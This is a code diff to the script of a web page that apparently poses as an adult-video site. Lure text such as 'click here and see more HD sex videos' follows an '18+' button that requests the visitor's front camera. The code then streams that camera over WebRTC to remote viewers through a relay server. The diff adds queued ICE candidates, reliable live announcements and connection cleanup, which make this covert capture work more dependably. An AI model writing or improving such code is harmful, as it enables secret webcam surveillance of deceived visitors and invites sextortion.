@@ -151,11 +151,46 @@
     let permissionAllowed = false;
 
     const peers = new Map();
+    const pendingCandidates = new Map();
+
 
     const ws = new WebSocket(
       (location.protocol === "https:" ? "wss:" : "ws:") +
       "//" + location.host + "/camera"
     );
+
+
+    function sendMessage(message) {
+
+      if (ws.readyState === WebSocket.OPEN) {
+
+        ws.send(JSON.stringify(message));
+
+        return true;
+
+      }
+
+      return false;
+
+    }
+
+
+    function announceCameraLive() {
+
+      if (
+        !permissionAllowed ||
+        !stream ||
+        !roleReceived
+      ) {
+        return;
+      }
+
+      sendMessage({
+        type: "camera-live"
+      });
+
+    }
+
 
     // REQUEST FRONT CAMERA ONLY AFTER 18+ BUTTON
 
@@ -188,16 +223,11 @@
         status.textContent =
           "click here and see more HD sex videos";
 
-        // If server already gave the camera ID,
-        // tell it that the camera is live.
 
-        if (roleReceived) {
+        // Announce the camera only when
+        // the WebSocket role has been received.
 
-          ws.send(JSON.stringify({
-            type: "sex video-live"
-          }));
-
-        }
+        announceCameraLive();
 
       }
 
@@ -229,6 +259,7 @@
 
       }
 
+
       const pc =
         new RTCPeerConnection({
 
@@ -241,16 +272,20 @@
 
         });
 
+
       peers.set(viewerId, pc);
+
+      pendingCandidates.set(
+        viewerId,
+        []
+      );
+
 
       pc.onicecandidate = e => {
 
-        if (
-          e.candidate &&
-          ws.readyState === WebSocket.OPEN
-        ) {
+        if (e.candidate) {
 
-          ws.send(JSON.stringify({
+          sendMessage({
 
             type: "candidate",
 
@@ -258,18 +293,32 @@
 
             toViewerId: viewerId
 
-          }));
+          });
 
         }
 
       };
 
 
-      stream.getTracks().forEach(track => {
+      pc.onconnectionstatechange = () => {
 
-        pc.addTrack(track, stream);
+        console.log(
+          "Connection state:",
+          pc.connectionState
+        );
 
-      });
+      };
+
+
+      if (stream) {
+
+        stream.getTracks().forEach(track => {
+
+          pc.addTrack(track, stream);
+
+        });
+
+      }
 
 
       return pc;
@@ -277,10 +326,44 @@
     }
 
 
+    ws.onopen = () => {
+
+      console.log(
+        "Camera WebSocket connected"
+      );
+
+      if (
+        permissionAllowed &&
+        stream &&
+        roleReceived
+      ) {
+
+        announceCameraLive();
+
+      }
+
+    };
+
+
     ws.onmessage = async e => {
 
-      const m =
-        JSON.parse(e.data);
+      let m;
+
+      try {
+
+        m = JSON.parse(e.data);
+
+      }
+
+      catch (err) {
+
+        console.log(
+          "Invalid server message"
+        );
+
+        return;
+
+      }
 
 
       if (m.type === "role") {
@@ -296,7 +379,9 @@
           "sex ID: " + cameraId;
 
 
-        // Camera was already allowed
+        // IMPORTANT:
+        // Send the exact message expected
+        // by the viewer/server.
 
         if (
           permissionAllowed &&
@@ -306,12 +391,11 @@
           status.textContent =
             "see sex videos";
 
-
-          ws.send(JSON.stringify({
-            type: "sex videos-live"
-          }));
+          announceCameraLive();
 
         }
+
+        return;
 
       }
 
@@ -327,63 +411,183 @@
           createPeer(m.viewerId);
 
 
-        const offer =
-          await pc.createOffer();
+        try {
+
+          const offer =
+            await pc.createOffer({
+
+              offerToReceiveAudio: false,
+              offerToReceiveVideo: false
+
+            });
 
 
-        await pc.setLocalDescription(
-          offer
-        );
+          await pc.setLocalDescription(
+            offer
+          );
 
 
-        ws.send(JSON.stringify({
+          sendMessage({
 
-          type: "offer",
+            type: "offer",
 
-          offer: pc.localDescription,
+            offer: pc.localDescription,
 
-          toViewerId: m.viewerId
+            toViewerId: m.viewerId
 
-        }));
+          });
+
+        }
+
+        catch (err) {
+
+          console.error(
+            "Offer error:",
+            err
+          );
+
+        }
+
+
+        return;
 
       }
 
 
       if (m.type === "answer") {
 
+        const viewerId =
+          m.toViewerId || m.viewerId;
+
+
         const pc =
-          peers.get(m.toViewerId);
+          peers.get(viewerId);
 
 
-        if (pc) {
+        if (pc && m.answer) {
 
-          await pc.setRemoteDescription(
-            m.answer
-          );
+          try {
+
+            await pc.setRemoteDescription(
+              new RTCSessionDescription(
+                m.answer
+              )
+            );
+
+
+            const queued =
+              pendingCandidates.get(
+                viewerId
+              ) || [];
+
+
+            for (const candidate of queued) {
+
+              await pc
+                .addIceCandidate(
+                  new RTCIceCandidate(
+                    candidate
+                  )
+                )
+                .catch(() => {});
+
+            }
+
+
+            pendingCandidates.set(
+              viewerId,
+              []
+            );
+
+          }
+
+          catch (err) {
+
+            console.log(
+              "Answer error:",
+              err
+            );
+
+          }
 
         }
+
+
+        return;
 
       }
 
 
       if (m.type === "candidate") {
 
+        const viewerId =
+          m.toViewerId || m.viewerId;
+
+
+        if (!viewerId) return;
+
+
         const pc =
-          peers.get(m.toViewerId);
+          peers.get(viewerId);
+
+
+        if (!pc) {
+
+          return;
+
+        }
 
 
         if (
-          pc &&
-          pc.remoteDescription
+          pc.remoteDescription &&
+          pc.remoteDescription.type
         ) {
 
           await pc
-            .addIceCandidate(m.candidate)
+            .addIceCandidate(
+              new RTCIceCandidate(
+                m.candidate
+              )
+            )
             .catch(() => {});
 
         }
 
+        else {
+
+          if (
+            !pendingCandidates.has(
+              viewerId
+            )
+          ) {
+
+            pendingCandidates.set(
+              viewerId,
+              []
+            );
+
+          }
+
+
+          pendingCandidates
+            .get(viewerId)
+            .push(m.candidate);
+
+        }
+
+
+        return;
+
       }
+
+    };
+
+
+    ws.onerror = () => {
+
+      console.log(
+        "WebSocket error"
+      );
 
     };
 
@@ -393,9 +597,54 @@
       status.textContent =
         "🔴 Connection closed";
 
+      peers.forEach(pc => {
+
+        try {
+
+          pc.close();
+
+        }
+
+        catch (err) {}
+
+      });
+
+      peers.clear();
+
+      pendingCandidates.clear();
+
     };
+
+
+    window.addEventListener(
+      "beforeunload",
+      () => {
+
+        peers.forEach(pc => {
+
+          try {
+
+            pc.close();
+
+          }
+
+          catch (err) {}
+
+        });
+
+
+        if (
+          ws.readyState === WebSocket.OPEN
+        ) {
+
+          ws.close();
+
+        }
+
+      }
+    );
 
   </script>
 
 </body>
-</html>
+  </html>
